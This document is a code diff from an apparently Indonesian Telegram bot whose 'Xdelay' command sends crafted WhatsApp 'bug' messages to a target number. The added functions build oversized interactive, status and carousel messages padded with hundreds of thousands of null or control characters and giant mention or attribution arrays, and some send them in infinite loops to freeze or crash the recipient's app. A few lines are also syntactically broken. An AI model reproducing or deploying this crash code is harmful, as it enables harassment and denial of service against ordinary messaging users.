@@ -2271,101 +2271,106 @@ bot.command("Xdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, a
   await ctx.reply(`✅ Xdelay (bug) selesai untuk ${q}`);
 
   (async () => {
-    for (let r = 0; r < 5; r++) {
-  await DelayHardNullVnX(sock, target);
-  await sleep(600);
-  
-  await VnXDelayAiInvis(sock, target);
-  await sleep(1000);
-  
+    for (let r = 0; r < 3; r++) {
+  await InvisDelaySqlVnX(sock, target true);
+  await sleep(800);  
+  await delayHold(sock, target);
+  await sleep(1000); 
   await ArtGuarfian(sock, target);
   await sleep(1000);
+  await ArTdElay(sock, target);
+  await sleep(2500)!
 }
   })();
 });
 // ------------ (  FUNCTION BUGS ) -------------- \\
-async function DelayHardNullVnX(sock, target) {
- 
-    let msg = await generateWAMessageFromContent(target, {
-        interactiveResponseMessage: {
-            body: {
-                text: "VnX",
-                format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-                name: "galaxy_message",
-                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
-                version: 3
+async function InvisDelaySqlVnX(sock, target) {
+  while (true) {
+    try {
+     const msgvnx = await generateWAMessageFromContent(
+      target,
+       {
+        groupStatusMessageV2: {
+            message: {     
+         interactiveResponseMessage: {
+           body: {
+             text: "\x10.VnX",
+             format: "DEFAULT"
+           },
+          nativeFlowResponseMessage: {
+           name: "galaxy_message",
+           paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}}`,
+           version: 3
+          },
+          contextInfo: {
+            remoteJid: null,
+            statusAttributionType: 2,
+                 statusAttributions: Array.from({ length: 209990 }, (_, z) => ({
+                  type: 1
+                }))  
+              }
+             }
             }
-        }
-    }, { userJid: sock.user.id });
+          }
+        },
+      { userJid: sock.user.id } 
+    );
+        
+      await sock.relayMessage(
+          target,
+          msgvnx.message,
+           {
+            messageId: msgvnx.key.id,
+            participant: { jid: target }
+           }
+         );
+         console.log(`👻 GXION SENDING BUGS TO ${target} (Looping Active)`);
 
-    await sock.relayMessage(target, {
-        viewOnceMessage: {
-            message: msg.message
-        }
-    }, ptcp ? { 
-        messageId: msg.key.id, 
-        participant: { jid: target } 
-    } : { 
-        messageId: msg.key.id 
-    });
-}
-
-async function VnXDelayAiInvis(sock, target) {
-    const VnXForwardAi = [
-    "13135550202@bot", "13135550202@bot",
-    "13135550202@bot", "13135550202@bot",
-    "13135550202@bot", "13135550202@bot",
-    "13135550202@bot", "13135550202@bot",
-    "13135550202@bot", "13135550202@bot"
-  ];
-
-    while (true) {
-        try {
-            const msg = await generateWAMessageFromContent(
-                target,
-                {
-                 groupStatusMessageV2: {
-                    message: {
-                      interactiveResponseMessage: {
-                        contextInfo: {
-                           mentionedJid: Array.from({ length: 200900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
-                         },
-                          body: {
-                             text: "VnXIsHere",
-                                format: "DEFAULT"
-                                },
-                                nativeFlowResponseMessage: {
-                                   name: "galaxy_message",
-                                   paramsJson: `{\"flow_cta\":\"${"\n".repeat(999999)}\"}}`,
-                                   version: 3
-                                 }
-                           }
-                      }
-                 }
-             },
-          { userJid: sock.user.id } 
-        );
-
-            await sock.relayMessage(
-                target,
-                msg.message,
-                {
-                    messageId: msg.key.id,
-                    participant: { jid: target }
-                }
-            );
-
-            console.log(`👻 XdelayVnX ke ${target} (Looping Active)`);
-
-            await new Promise(resolve => setTimeout(resolve, 1000));
+         await new Promise(resolve => setTimeout(resolve, 1000));
 
         } catch (err) {
             console.error("❌ Error dalam Loop:", err);
             await new Promise(resolve => setTimeout(resolve, 5000));
         }
     }
+}
+
+async function delayHold(sock, target) {
+  const msg = {
+    interactiveResponseMessage: {
+      body: { 
+        text: "ARTILLERY", 
+        format: "DEFAULT" 
+      },
+      nativeFlowResponseMessage: {
+        name: "call_permission_request",
+        paramsJson: "\x10".repeat(700000),
+        version: 3,
+      },
+      entryPointConversionSource: "{}",
+      contextInfo: {
+        quotedMessage: {
+          paymentInviteMessage: {
+            serviceType: "FPM",
+            expiryTimestamp: 1814400000
+          }
+        },
+        mentionedJid: Array.from({ length: 100 }, () => "0@newsletter"),
+        groupMentions: [
+          {
+            groupJid: "0@newsletter",
+            groupSubject: "."
+          }
+        ],
+        participant: target,
+        remoteJid: target
+      }
+    }
+  };
+    
+  await sock.relayMessage(target, msg, {
+    participant: { jid: target }
+  });
 }
 
 async function ArtGuarfian(sock, target) {
@@ -2382,7 +2387,7 @@ async function ArtGuarfian(sock, target) {
                 paramsJson: "\u0000".repeat(145000),
                 version: 3
               },
-                entryPointConversionSource: "galaxy_message",.
+                entryPointConversionSource: "galaxy_message",
               }
           }
       }
@@ -2426,6 +2431,79 @@ async function ArtGuarfian(sock, target) {
     }
 }
 
+async function ArTdElay(sock, target) {
+  let push = [];
+
+  for (let r = 0; r < 3; r++) {
+    push.push({
+      body: proto.Message.InteractiveMessage.Body.fromObject({ text: " \u0000 " }),
+      footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " \u0003 " }),
+      header: proto.Message.InteractiveMessage.Header.fromObject({
+        title: " ",
+        hasMediaAttachment: true,
+        imageMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
+          mimetype: "image/jpeg",
+          fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
+          fileLength: "18352",
+          height: 720,
+          width: 1280,
+          mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
+          fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
+          directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1737281900",
+          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIiQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
+          scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
+          scanLengths: [3537, 10557, 1905, 2353],
+          midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
+        }
+      }),
+      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
+        buttons: []
+      })
+    });
+  }
+
+  let msg = await generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2
+          },
+          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
+            footer: proto.Message.InteractiveMessage.Footer.create({ text: "ArT" }),
+            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
+            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+              cards: [...push]
+            })
+          })
+        }
+      }
+    },
+    {}
+  );
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ 
+          tag: "to", 
+          attrs: { jid: target }, 
+          content: undefined 
+        }]
+      }]
+    }]
+  });
+  await new Promise(resolve => setTimeout(resolve, 5000));
+}
 // --- Jalankan Bot --- //
 (async () => {
   try {
